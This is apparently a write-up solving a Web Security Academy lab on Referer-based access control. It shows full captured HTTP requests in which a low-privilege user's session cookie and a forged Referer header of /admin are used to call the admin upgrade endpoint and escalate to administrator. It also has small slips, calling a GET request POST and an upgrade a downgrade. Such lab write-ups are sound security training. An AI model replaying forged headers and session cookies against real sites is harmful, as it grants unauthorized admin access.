## Referer-based access control

This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.

## Notes

- /admin
- /login

## Resume

1. Login with administrator:admin
2. Capture the **GET** request from **Upgrade user**
3. Log off and login with wiener:peter
4. Resend request on **Upgrade user** with wiener cookies and add the Referer `/admin`


## Solve 

## Solve 

First, log in with administrator:admin to see what the admin portal look like and capture a **POST** request on **Upgrade user** aftre we get the request, downgrade the account : 

```
GET /admin-roles?username=carlos&action=upgrade HTTP/2
Host: 0ace004e044af3b88017214e00b1000a.web-security-academy.net
Cookie: session=W2lcscZLhIB45WhUmMIYW3qZrLaQ0MBE
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ace004e044af3b88017214e00b1000a.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Log off then access to wiener account and update the previous request with the session cookies : 

```
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0ace004e044af3b88017214e00b1000a.web-security-academy.net
Cookie: session=XUBQGmkYiPfhwiB9asCnwb7p84gfvWLS
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ace004e044af3b88017214e00b1000a.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```